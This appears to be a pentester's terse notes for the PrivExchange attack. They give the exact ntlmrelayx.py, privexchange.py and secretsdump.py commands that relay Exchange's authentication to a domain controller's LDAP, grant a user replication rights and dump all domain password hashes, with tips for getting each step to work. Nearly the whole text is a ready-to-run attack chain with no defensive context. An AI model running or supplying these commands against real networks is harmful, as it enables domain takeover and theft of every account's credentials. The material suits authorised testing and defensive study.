Exchange attack to dump password hashes from DC

https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/

Run both ntlmrelayx and privexchange.py


ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user username

*****privexchange HAS to be run with "python", errors out when doing "./privexchange.py"

python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u username -d testsegment.local

*****User must have a mailbox for this to work

It will tell you that "Success! etc etc Replication-Get-Change-All" worked

After that you can stop it, it takes around a minute for a connection to appear on ntlmrelayx, and boom! 

Next, run secretsdump.py 

./secretsdump.py domain.local/username@DCname.domain -just-dc

./secretsdump.py integrity.local/faloul@primarydc01.integrity.local -just-dc
